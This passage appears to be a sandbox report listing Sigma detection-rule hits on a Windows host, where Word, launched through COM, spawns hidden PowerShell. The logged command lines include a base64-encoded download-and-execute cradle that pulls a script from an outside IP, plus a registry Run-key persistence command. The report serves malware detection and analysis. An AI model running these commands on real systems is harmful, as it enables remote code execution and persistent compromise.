{
    "data":  {
                 "sigma_analysis_results":  [
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "TargetFilename":  "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Templates\\~$Normal.dotm"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "low",
                                                    "rule_id":  "27801b0f98df1ce7686b07b693c59e734c47189ef3db24ea1093f6f00ff2ed67",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Office Macro File Creation",
                                                    "rule_description":  "Detects the creation of a new office macro files on the systems",
                                                    "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "T1060,RunKey",
                                                                                             "UtcTime":  "1689035016",
                                                                                             "Details":  "c:\\temp\\explore.bat",
                                                                                             "ProcessGuid":  "{C784477D-A108-64AC-5806-000000004600}",
                                                                                             "EventID":  "13",
                                                                                             "ProcessId":  "6336",
                                                                                             "Image":  "C:\\Windows\\system32\\reg.exe",
                                                                                             "EventType":  "SetValue",
                                                                                             "TargetObject":  "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\.explore"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "high",
                                                    "rule_id":  "27b72c2678411f21ba21bd10b44b7e9c45594d5a5f61f14223b81a8906675039",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "New RUN Key Pointing to Suspicious Folder",
                                                    "rule_description":  "Detects suspicious new RUN key element pointing to an executable in a suspicious folder",
                                                    "rule_author":  "Florian Roth (Nextron Systems), Markus Neis, Sander Wiebing"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Windows\\system32\\",
                                                                                             "LogonId":  "212902",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "1689035014",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
                                                                                             "ParentImage":  "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "3204",
                                                                                             "ParentProcessGuid":  "{C784477D-A0FF-64AC-4D06-000000004600}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-0B2F-6482-A63F-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A106-64AC-5406-000000004600}",
                                                                                             "CommandLine":  "powershell.exe -window hidden -e cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQB3ACAAaABpAGQAZABlAG4AIAAtAG4AbwBuAGkAIAAtAG4AbwBwACAALQBjACAAIgBpAGUAeAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwA2ADkALgA4ADcALgAyADIAMwAuADIANgA6ADgAMAA4ADAALwBlAGkAbABvAFMAaABhAGUAZwBhAGUAMQAnACkAIgA=",
                                                                                             "ParentCommandLine":  "\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /Automation -Embedding",
                                                                                             "ProcessId":  "4520",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "high",
                                                    "rule_id":  "2b81c8afee92062579f4f19ea901c1194542107857913a32a13108debb721c71",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Net WebClient Casing Anomalies",
                                                    "rule_description":  "Detects PowerShell command line contents that include a suspicious abnormal casing in the Net.Webclient (e.g. nEt.WEbCliEnT) string as used in obfuscation techniques",
                                                    "rule_author":  "Florian Roth (Nextron Systems)"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Windows\\system32\\",
                                                                                             "LogonId":  "212902",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "1689035016",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "4520",
                                                                                             "ParentProcessGuid":  "{C784477D-A106-64AC-5406-000000004600}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-0B2F-6482-A63F-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A108-64AC-5906-000000004600}",
                                                                                             "CommandLine":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString(\u0027http://69.87.223.26:8080/eiloShaegae1\u0027)\"",
                                                                                             "ParentCommandLine":  "powershell.exe -window hidden -e cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQB3ACAAaABpAGQAZABlAG4AIAAtAG4AbwBuAGkAIAAtAG4AbwBwACAALQBjACAAIgBpAGUAeAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwA2ADkALgA4ADcALgAyADIAMwAuADIANgA6ADgAMAA4ADAALwBlAGkAbABvAFMAaABhAGUAZwBhAGUAMQAnACkAIgA=",
                                                                                             "ProcessId":  "6760",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "high",
                                                    "rule_id":  "e88280a32f81c8575c3cb9b02910d867498fbf28ca75ca922ad991faa3a68879",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "PowerShell Download and Execution Cradles",
                                                    "rule_description":  "Detects PowerShell download and execution cradles.",
                                                    "rule_author":  "Florian Roth (Nextron Systems)"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "T1060,RunKey",
                                                                                             "UtcTime":  "1689035016",
                                                                                             "Details":  "c:\\temp\\explore.bat",
                                                                                             "ProcessGuid":  "{C784477D-A108-64AC-5806-000000004600}",
                                                                                             "EventID":  "13",
                                                                                             "ProcessId":  "6336",
                                                                                             "Image":  "C:\\Windows\\system32\\reg.exe",
                                                                                             "EventType":  "SetValue",
                                                                                             "TargetObject":  "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\.explore"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "CurrentVersion Autorun Keys Modification",
                                                    "rule_description":  "Detects modification of autostart extensibility point (ASEP) in registry.",
                                                    "rule_author":  "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Windows\\system32\\",
                                                                                             "LogonId":  "212902",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "1689035016",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "4520",
                                                                                             "ParentProcessGuid":  "{C784477D-A106-64AC-5406-000000004600}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-0B2F-6482-A63F-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A108-64AC-5906-000000004600}",
                                                                                             "CommandLine":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString(\u0027http://69.87.223.26:8080/eiloShaegae1\u0027)\"",
                                                                                             "ParentCommandLine":  "powershell.exe -window hidden -e cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQB3ACAAaABpAGQAZABlAG4AIAAtAG4AbwBuAGkAIAAtAG4AbwBwACAALQBjACAAIgBpAGUAeAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwA2ADkALgA4ADcALgAyADIAMwAuADIANgA6ADgAMAA4ADAALwBlAGkAbABvAFMAaABhAGUAZwBhAGUAMQAnACkAIgA=",
                                                                                             "ProcessId":  "6760",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "dac677b84d14788387f1c92fd6733396974f070639fca6be1bbf50df44b426cf",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "PowerShell Web Download",
                                                    "rule_description":  "Detects suspicious ways to download files or content using PowerShell",
                                                    "rule_author":  "Florian Roth (Nextron Systems)"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Windows\\system32\\",
                                                                                             "LogonId":  "212902",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "1689035014",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
                                                                                             "ParentImage":  "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "3204",
                                                                                             "ParentProcessGuid":  "{C784477D-A0FF-64AC-4D06-000000004600}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-0B2F-6482-A63F-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A106-64AC-5606-000000004600}",
                                                                                             "CommandLine":  "powershell.exe reg add HKCU\\software\\microsoft\\windows\\currentversion\\run /v .explore /t REG_SZ  /d c:\\temp\\explore.bat",
                                                                                             "ParentCommandLine":  "\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /Automation -Embedding",
                                                                                             "ProcessId":  "1292",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Windows\\system32\\",
                                                                                             "LogonId":  "212902",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "1689035016",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "4520",
                                                                                             "ParentProcessGuid":  "{C784477D-A106-64AC-5406-000000004600}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-0B2F-6482-A63F-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A108-64AC-5906-000000004600}",
                                                                                             "CommandLine":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString(\u0027http://69.87.223.26:8080/eiloShaegae1\u0027)\"",
                                                                                             "ParentCommandLine":  "powershell.exe -window hidden -e cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQB3ACAAaABpAGQAZABlAG4AIAAtAG4AbwBuAGkAIAAtAG4AbwBwACAALQBjACAAIgBpAGUAeAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwA2ADkALgA4ADcALgAyADIAMwAuADIANgA6ADgAMAA4ADAALwBlAGkAbABvAFMAaABhAGUAZwBhAGUAMQAnACkAIgA=",
                                                                                             "ProcessId":  "6760",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "dc48d8314d305b4c97b9f813958e20738bb989b83928e70ea811bb7c0bf7e197",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Suspicious PowerShell Invocations - Specific - ProcessCreation",
                                                    "rule_description":  "Detects suspicious PowerShell invocation command parameters",
                                                    "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Windows\\system32\\",
                                                                                             "LogonId":  "212902",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "1689035014",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
                                                                                             "ParentImage":  "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "3204",
                                                                                             "ParentProcessGuid":  "{C784477D-A0FF-64AC-4D06-000000004600}",
                                                                                             "Product":  "Microsoft\\xae Windows\\xae Operating System",
                                                                                             "LogonGuid":  "C784477D-0B2F-6482-A63F-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A106-64AC-5406-000000004600}",
                                                                                             "CommandLine":  "powershell.exe -window hidden -e cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQB3ACAAaABpAGQAZABlAG4AIAAtAG4AbwBuAGkAIAAtAG4AbwBwACAALQBjACAAIgBpAGUAeAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwA2ADkALgA4ADcALgAyADIAMwAuADIANgA6ADgAMAA4ADAALwBlAGkAbABvAFMAaABhAGUAZwBhAGUAMQAnACkAIgA=",
                                                                                             "ParentCommandLine":  "\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /Automation -Embedding",
                                                                                             "ProcessId":  "4520",
                                                                                             "FileVersion":  "10.0.17134.1 (WinBuild.160101.0800)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "eb75f9de2201bfad4ef177dca85b0b8fa8e5a86ba2357af5301f72acbc5eb144",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Suspicious Execution of Powershell with Base64",
                                                    "rule_description":  "Commandline to launch powershell with a base64 payload",
                                                    "rule_author":  "frack113"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Windows\\system32\\",
                                                                                             "LogonId":  "212902",
                                                                                             "OriginalFileName":  "WinWord.exe",
                                                                                             "UtcTime":  "1689035007",
                                                                                             "Description":  "Microsoft Word",
                                                                                             "User":  "DESKTOP-B0T93D6\\george",
                                                                                             "Hashes":  "MD5=CE33FC3C687D3C01159A8CAEA7F5482E,SHA256=5D75D0EA8BBB5B652F7B72CF728C00322BD486D54A5C4978CEACDF70B4317EE6,IMPHASH=1B2B96B0763DACAFA277667CA093F96D",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\svchost.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                                                                                             "ParentProcessId":  "848",
                                                                                             "ParentProcessGuid":  "{C784477D-0B2A-6482-0E00-000000004600}",
                                                                                             "Product":  "Microsoft Office 2016",
                                                                                             "LogonGuid":  "C784477D-0B2F-6482-A63F-030000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "{C784477D-A0FF-64AC-4D06-000000004600}",
                                                                                             "CommandLine":  "\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /Automation -Embedding",
                                                                                             "ParentCommandLine":  "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
                                                                                             "ProcessId":  "3204",
                                                                                             "FileVersion":  "16.0.4266.1001",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "ffbbcedfb9a1fd41ebb288154c10cf5cf869eb25195708be30f8a9df74f411cc",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Suspicious New Instance Of An Office COM Object",
                                                    "rule_description":  "Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as \u0027Word.Application\u0027, \u0027Excel.Application\u0027, etc.\nThis can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)\n",
                                                    "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                },
